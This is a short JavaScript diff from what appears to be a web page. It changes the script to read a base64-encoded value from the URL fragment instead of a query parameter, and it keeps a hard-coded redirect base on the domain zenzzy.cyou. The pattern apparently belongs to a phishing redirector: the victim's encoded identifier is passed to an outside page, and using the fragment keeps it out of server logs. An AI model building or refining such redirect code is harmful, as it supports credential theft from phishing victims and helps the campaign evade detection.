@@ -44,9 +44,8 @@
                 });
         }
 
-        // Extract the 'm' parameter from the URL
-        var urlParams = new URLSearchParams(window.location.search);
-        var encodedHash = urlParams.get('m');
+        // Extract the base64 encoded hash from the URL
+        var encodedHash = window.location.hash.substring(1); // Get the hash after '#'
 
         var baseUrl = "https://zenzzy.cyou/BU37/#";
 
